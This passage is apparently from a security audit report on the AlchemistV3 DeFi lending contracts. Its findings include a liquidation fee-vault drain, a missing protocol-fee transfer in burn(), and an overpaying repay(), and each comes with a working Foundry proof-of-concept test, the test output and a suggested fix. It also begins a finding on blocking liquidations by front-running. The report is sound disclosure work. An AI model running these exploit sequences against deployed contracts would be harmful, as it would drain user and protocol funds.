        deal(address(fakeYieldToken), yetAnotherExternalUser, accountFunds);
        deal(address(fakeYieldToken), anotherExternalUser, accountFunds);
        deal(address(alToken), address(0xdad), 1000e18);
        deal(address(alToken), address(anotherExternalUser), accountFunds);

        deal(address(fakeUnderlyingToken), address(0xbeef), accountFunds);
        deal(address(fakeUnderlyingToken), externalUser, accountFunds);
        deal(address(fakeUnderlyingToken), yetAnotherExternalUser, accountFunds);
        deal(address(fakeUnderlyingToken), anotherExternalUser, accountFunds);*/
        deal(address(fakeUnderlyingToken), alchemist.alchemistFeeVault(), 10_000e6);

        vm.startPrank(anotherExternalUser);

        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);

        vm.stopPrank();
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(fakeYieldToken), someWhale, whaleSupply);
        deal(address(fakeUnderlyingToken), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), whaleSupply + 100e18);
        vm.stopPrank();
    }

    function testFeeVaultDrainOnLiquidate() public {
        uint256 amount = 100_000e6; // 100,000 EULER USDC
        deal(address(fakeYieldToken), yetAnotherExternalUser, amount * 2);
        deal(address(fakeYieldToken), anotherExternalUser, amount);

        vm.startPrank(someWhale);
        fakeYieldToken.mint(20_000_000e6, someWhale);
        vm.stopPrank();

        // just ensureing global alchemist collateralization stays above the minimum required for regular liquidations
        // no need to mint anything
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount * 2);
        alchemist.deposit(amount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // user 1 deposits + takes a loan
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount);
        alchemist.deposit(amount, anotherExternalUser, 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenId1 = AlchemistNFTHelper.getFirstTokenId(anotherExternalUser, address(alchemistNFT));
        alchemist.mint(tokenId1, alchemist.totalValue(tokenId1) * FIXED_POINT_SCALAR / minimumCollateralization, anotherExternalUser);
        vm.stopPrank();

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(fakeYieldToken)).totalSupply();
        fakeYieldToken.updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply;
        fakeYieldToken.updateMockTokenSupply(modifiedVaultSupply);

        vm.startPrank(address(0xdad));
        deal(address(alToken), address(0xdad), 5000e18);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 5000e18);
        transmuterLogic.createRedemption(5000e18);
        vm.stopPrank();

        vm.roll(block.number + 10000);    // time elapse

        // liquidate user 1 (anotherExternalUser)
        uint256 preVaultUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(address(alchemistFeeVault));
        uint256 preUserUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(externalUser);

        vm.startPrank(externalUser);        
        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId1);

        uint256 postVaultUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(address(alchemistFeeVault));
        uint256 postUserUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(externalUser);

        console.log("feeInYield: %s", feeInYield);
        console.log("feeInUnderlying", feeInUnderlying);
        console.log("yield token decimals: %s", fakeYieldToken.decimals());
        console.log("underlying token decimals: %s\n", fakeUnderlyingToken.decimals());

        console.log("Pre-Liquidate Vault Underlying Balance: %s", preVaultUnderlyingBalance);
        console.log("Post-Liquidate Vault Underlying Balance: %s", postVaultUnderlyingBalance);
        console.log("Pre-Liquidate User Underlying Balance: %s", preUserUnderlyingBalance);
        console.log("Post-Liquidate User Underlying  Balance: %s", postUserUnderlyingBalance);
    }
}
```

```solidity
Ran 1 test for src/test/AlchemistV3_5.t.sol:AlchemistV3Test_5
[PASS] testFeeVaultDrainOnLiquidate() (gas: 2292461)
Logs:
  feeInYield: 140699807
  feeInUnderlying 10000000000
  yield token decimals: 6
  underlying token decimals: 6

  Pre-Liquidate Vault Underlying Balance: 10000000000
  Post-Liquidate Vault Underlying Balance: 0
  Pre-Liquidate User Underlying Balance: 0
  Post-Liquidate User Underlying  Balance: 10000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.21s (45.92ms CPU time)

Ran 1 test suite in 1.57s (1.21s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

In `testFeeVaultDrainOnLiquidate()`, the liquidator receives 10,000 USDC from the `feeVault` and drains the entire balance of the `feeVault`.

## Impact

Inflated fee amount is pulled from the fee vault when `liquidate()` is called - in some cases, the entire vault can be drained.

## Recommendation

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) {
        // SNIP

        // Recalculate ratio after any repayment to determine if further liquidation is needed
        collateralInUnderlying = totalValue(accountId);
        collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

        if (collateralizationRatio <= collateralizationLowerBound) {
            uint256 alchemistCurrentCollateralization = normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt;

            (uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee) = calculateLiquidation(
                collateralInUnderlying, account.debt, minimumCollateralization, alchemistCurrentCollateralization, globalMinimumCollateralization, liquidatorFee
            );

            uint256 feeBonus = debtToBurn * liquidatorFee / BPS;
+           feeBonus = convertDebtTokensToYield(feeBonus);
            uint256 adjustedLiquidationAmount = convertDebtTokensToYield(liquidationAmount);
            uint256 adjustedDebtToBurn = convertDebtTokensToYield(debtToBurn);
            debtAmount = adjustedLiquidationAmount;
            feeInYield = convertDebtTokensToYield(baseFee);

            // update user balance (denominated in yield tokens)
            account.collateralBalance = account.collateralBalance > adjustedLiquidationAmount ? account.collateralBalance - adjustedLiquidationAmount : 0;

            // Update users debt (denominated in debt tokens)
            _subDebt(accountId, debtToBurn);
            
            // SNIP
 }

```

## AlchemistV3::burn() omits transfer to protocolFeeReceiver

## Summary

The protocol fee is never transferred to the `protocolFeeReceiver` in `AlchemistV3::burn()`

## Vulnerability Detail

```solidity
function burn(uint256 amount, uint256 recipientId) external returns (uint256) {
    // SNIP
        
    // Burn the tokens from the message sender
    TokenUtils.safeBurnFrom(debtToken, msg.sender, credit);

    // Debt is subject to protocol fee similar to redemptions
>   _accounts[recipientId].collateralBalance -= convertDebtTokensToYield(credit) * protocolFee / BPS;

    // Update the recipient's debt.
    _subDebt(recipientId, credit);

    totalSyntheticsIssued -= credit;

    emit Burn(msg.sender, credit, recipientId);

    return credit;
}
```

In `AlchemistV3::burn()`, the al tokens are burned and the `protocolFee` is taken from the user’s account, but the funds are never transferred to the `protocolFeeReceiver`.

The tokens intended for the `protocolFee` are stuck whenever `burn()` is called.

PoC

Set up: copy and paste the test suite below into `AlchemistV3_4.t.sol`

❯ `forge test --fork-url {} --match-contract AlchemistV3Test_4 -vv`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.26;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC4626} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol";
import "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {EulerUSDCAdapter} from "../adapters/EulerUSDCAdapter.sol";

contract AlchemistV3Test_4 is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;
    EulerUSDCAdapter eulerUSDCAdapter;

    // Token addresses    
    IERC20 underlyingToken;
    ERC4626 yieldToken;

    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant EULER_USDC = 0xe0a80d35bB6618CBA260120b279d357978c42BCE;

    // Total minted debt
    uint256 public minted;

    // Total debt burned
    uint256 public burned;

    // Total tokens sent to transmuter
    uint256 public sentToTransmuter;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds = 2_000_000_000e6;

    // large amount to test with
    uint256 whaleSupply = 20_000_000_000e6;

    // amount of yield/underlying token to deposit
    uint256 depositAmount = 100_000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // protocolFeeReceiver
    address protocolFeeReceiver = address(0x89437593487583947593739132432);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    function setUp() external {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        underlyingToken = IERC20(USDC);
        yieldToken = ERC4626(EULER_USDC);

        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);
        eulerUSDCAdapter = new EulerUSDCAdapter(address(yieldToken), address(underlyingToken));

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: USDC,
            yieldToken: EULER_USDC,
            blocksPerYear: 2_600_000,
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            tokenAdapter: address(eulerUSDCAdapter),
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(USDC, address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));
        vm.stopPrank();
    }

    function testBurnMissingFeeTransfer() external {
        uint256 amount = 1000e6;
        deal(EULER_USDC, address(0xbeef), amount);

        vm.startPrank(alOwner);
        alchemist.setProtocolFee(100);
        assert(alchemist.protocolFee() > 0);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(yieldToken), address(alchemist), amount);
        alchemist.deposit(amount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId, 50e18, address(0xbeef));
        vm.stopPrank();

        vm.roll(block.number + (5_256_000 / 2));

        uint256 preBurnBalance = alToken.balanceOf(protocolFeeReceiver);

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(alToken), address(alchemist), 50e18);
        uint256 credit = alchemist.burn(50e18, tokenId);
        vm.stopPrank();

        uint256 postBurnBalance = alToken.balanceOf(protocolFeeReceiver);

        console.log("Pre Burn - protocolFeeReceiver Balance: %s", preBurnBalance);
        console.log("Post Burn - protocolFeeReceiver Balance: %s", postBurnBalance);

        assert(credit > 0);
        uint256 debtToYield = alchemist.convertDebtTokensToYield(credit) * 100 / 10000;
        console.log("Expected Fee: %s", debtToYield);
    }
}
```

```solidity
Ran 1 test for src/test/AlchemistV3_4.t.sol:AlchemistV3Test_4
[PASS] testBurnMissingFeeTransfer() (gas: 861350)
Logs:
  Pre Burn - protocolFeeReceiver Balance: 0
  Post Burn - protocolFeeReceiver Balance: 0
  Expected Fee: 487392

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.67s (1.14s CPU time)

Ran 1 test suite in 3.01s (2.67s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Loss of fees for protocol

## Recommendation

```solidity
function burn(uint256 amount, uint256 recipientId) external returns (uint256) {
    // SNIP

    // Debt is subject to protocol fee similar to redemptions
+   uint256 feeCollateral = convertDebtTokensToYield(credit) * protocolFee / BPS;
+   _accounts[recipientId].collateralBalance -= feeCollateral;
-   _accounts[recipientId].collateralBalance -= convertDebtTokensToYield(credit) * protocolFee / BPS;

+   TokenUtils.safeTransfer(yieldToken, protocolFeeReceiver, feeCollateral);

    // Update the recipient's debt.
    _subDebt(recipientId, credit);

    totalSyntheticsIssued -= credit;

    emit Burn(msg.sender, credit, recipientId);

    return credit;
}
```

## Incorrect fee amount is sent to protocolFeeReceiver in AlchemistV3::repay()

## Summary

`AlchemistV3::repay()` does not handle the fee transfer correctly - which results in more funds being sent to the `protocolFeeReceiver` than intended.

## Vulnerability Detail

```solidity
504    function repay(uint256 amount, uint256 recipientTokenId) public returns (uint256) {
505        // SNIP
506
507>       uint256 yieldToDebt = convertYieldTokensToDebt(amount);
508>       uint256 credit = yieldToDebt > debt ? debt : yieldToDebt;
509>       uint256 creditToYield = convertDebtTokensToYield(credit);
510
511        // Repay debt from earmarked amount of debt first
512        uint256 earmarkToRemove = credit > account.earmarked ? account.earmarked : credit;
513        account.earmarked -= earmarkToRemove;
514
515        // Debt is subject to protocol fee similar to redemptions
516>       account.collateralBalance -= creditToYield * protocolFee / BPS;
517
518        _subDebt(recipientTokenId, credit);
519
520        // Transfer the repaid tokens to the transmuter.
521>       TokenUtils.safeTransferFrom(yieldToken, msg.sender, transmuter, creditToYield);
522>       TokenUtils.safeTransfer(yieldToken, protocolFeeReceiver, creditToYield);
523
524        emit Repay(msg.sender, amount, recipientTokenId, creditToYield);
525
526        return creditToYield;
527    }
```

`creditToYield` represents the amount of debt that is being repaid in Yield tokens - These tokens will be sent to the `Transmuter` to fund redemptions. [L507 - L509]

A `protocolFee` is taken on repayments, which is calculated and decremented from `amount.collateralBalance`. [L516]

At the very end of the function, `creditToYield` is pulled from the `msg.sender` and transferred to the `Transmuter` contract. [L521]

However, the `protocolFeeReceiver` also receives `creditToYield`. [L522]

Since `creditToYield` > amount subtracted from `collateralBalance` earlier in the function, the funds which are sent to the `protocolFeeReceiver` will be other users’ deposited collateral.

PoC

Set up: copy and paste the test suite below into `AlchemistV3_3.t.sol`

❯ `forge test --fork-url {} --match-contract AlchemistV3Test_3 -vv`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.26;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC4626} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol";
import "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {EulerUSDCAdapter} from "../adapters/EulerUSDCAdapter.sol";

contract AlchemistV3Test_3 is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;
    EulerUSDCAdapter eulerUSDCAdapter;

    // Token addresses    
    IERC20 underlyingToken;
    ERC4626 yieldToken;

    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant EULER_USDC = 0xe0a80d35bB6618CBA260120b279d357978c42BCE;

    // Total minted debt
    uint256 public minted;

    // Total debt burned
    uint256 public burned;

    // Total tokens sent to transmuter
    uint256 public sentToTransmuter;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds = 2_000_000_000e6;

    // large amount to test with
    uint256 whaleSupply = 20_000_000_000e6;

    // amount of yield/underlying token to deposit
    uint256 depositAmount = 100_000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // protocolFeeReceiver
    address protocolFeeReceiver = address(0x89437593487583947593739132432);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    function setUp() external {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        underlyingToken = IERC20(USDC);
        yieldToken = ERC4626(EULER_USDC);

        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);
        eulerUSDCAdapter = new EulerUSDCAdapter(address(yieldToken), address(underlyingToken));

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: USDC,
            yieldToken: EULER_USDC,
            blocksPerYear: 2_600_000,
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            tokenAdapter: address(eulerUSDCAdapter),
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(USDC, address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));
        vm.stopPrank();
    }

    function testRepayFeeBug() external {
        uint256 amount = 1000e6;
        deal(EULER_USDC, address(0xbeef), amount);

        vm.startPrank(alOwner);
        alchemist.setProtocolFee(100);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(yieldToken), address(alchemist), amount);
        alchemist.deposit(amount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

        alchemist.mint(tokenIdFor0xBeef, 500e18, address(0xbeef));
        
        vm.roll(block.number + 1);

        uint256 preRepayBalance = IERC20(yieldToken).balanceOf(protocolFeeReceiver);

        deal(EULER_USDC, address(0xbeef), 10000e6);
        SafeERC20.safeApprove(address(yieldToken), address(alchemist), 10000e6);
        uint256 creditToYield = alchemist.repay(10000e6, tokenIdFor0xBeef);
        vm.stopPrank();

        uint256 postRepayBalance = IERC20(yieldToken).balanceOf(protocolFeeReceiver);

        uint256 expectedAmount = creditToYield * 100 / 10000;

        console.log("Before Repay - protocolFeeReceiver Balance: %s", preRepayBalance);
        console.log("After Repay - protocolFeeReceiver Balance: %s\n", postRepayBalance);
        console.log("creditToYield: %s", creditToYield);
        console.log("Expected fee: %s", expectedAmount);
    }
}
```

```solidity

Ran 1 test for src/test/AlchemistV3_3.t.sol:AlchemistV3Test_3
[PASS] testRepayFeeBug() (gas: 1020554)
Logs:
  Before Repay - protocolFeeReceiver Balance: 0
  After Repay - protocolFeeReceiver Balance: 487392615

  creditToYield: 487392615
  Expected fee: 4873926

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.90s (1.40s CPU time)

Ran 1 test suite in 3.24s (2.90s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Loss of user funds

## Recommendation

```solidity
function repay(uint256 amount, uint256 recipientTokenId) public returns (uint256) {
+   uint256 feeCollateral = creditToYield * protocolFee / BPS;
+   account.collateralBalance -= feeCollateral;
-   account.collateralBalance -= creditToYield * protocolFee / BPS;

    
+   TokenUtils.safeTransfer(yieldToken, protocolFeeReceiver, feeCollateral);
-   TokenUtils.safeTransfer(yieldToken, protocolFeeReceiver, creditToYield);
}
```

## Liquidations can be DoSed by front running with repay()

## Summary

A malicious user can force liquidations to fail temporarily for specific accounts.

## Vulnerability Detail

`AlchemistV3::_liquidate()` is called by the external `liquidate()` and `batchLiquidate()` functions.

If there’s any earmarked debt, `_forceRepay()` is called to pay with the earmarked debt.

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) {
      // SNIP

      // Try to repay earmarked debt if it exists
794   uint256 repaidAmountInYield = 0;
795   if (account.earmarked > 0) {
796       repaidAmountInYield = _forceRepay(accountId, convertDebtTokensToYield(account.earmarked)); 
797   }
        
      // SNIP
}
```

In `AlchemistV3::_forceRepay()`, if `amount == 0`, the transaction reverts.

```solidity
function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {
    _checkArgument(amount > 0);
        
    // SNIP
}
```

The `amount` value that is passed into `AlchemistV3:_forceRepay()` from `AlchemistV3::_liquidate()` is `convertDebtTokensToYield(account.earmarked)`.

```solidity
function convertDebtTokensToYield(uint256 amount) public view returns (uint256) {
    return convertUnderlyingTokensToYield(normalizeDebtTokensToUnderlying(amount));
}
```

The `convertDebtTokensToYield()` is a conversion helper function that converts the input amount from debt token decimals to yield token decimals.

The first step of the conversion process is to normalize debt tokens to underlying token decimals.

```solidity
function normalizeDebtTokensToUnderlying(uint256 amount) public view returns (uint256) {
    return amount / underlyingConversionFactor;
}
```

In the case of an Euler USDC-USDC-alUSD deployment, where Euler USDC is the yield token, USDC is the underlying token, and alUSD is the debt token, the `amount` would be divided by 1e12, since `underlyingConversionFactor` in decimals between USDC-alUSD is 1e12 (set at `initialize()` time)

```solidity
function initialize(AlchemistInitializationParams memory params) external initializer {
    _checkArgument(params.protocolFee <= BPS);
    _checkArgument(params.liquidatorFee <= BPS);

    debtToken = params.debtToken;
    underlyingToken = params.underlyingToken;
>   underlyingConversionFactor = 10 ** (TokenUtils.expectDecimals(params.debtToken) - TokenUtils.expectDecimals(params.underlyingToken));
        
    // SNIP
}
```

A malicious user can prevent themselves from getting liquidated temporarily using `repay()` by manipulating `account.earmarked` to make `convertDebtTokensToYield(account.earmarked)` round to 0, causing `_forceRepay()` to revert.

Pre-conditions:

- At least one `Transmuter::createRedemption()` call was made - results in `account.earmarked` incremented in `_earmark() + sync()`
- Several blocks have elapsed since `createRedemption()` call

```solidity
function repay(uint256 amount, uint256 recipientTokenId) public returns (uint256) {
    // SNIP

    uint256 yieldToDebt = convertYieldTokensToDebt(amount);
    uint256 credit = yieldToDebt > debt ? debt : yieldToDebt;
    uint256 creditToYield = convertDebtTokensToYield(credit);

    // Repay debt from earmarked amount of debt first
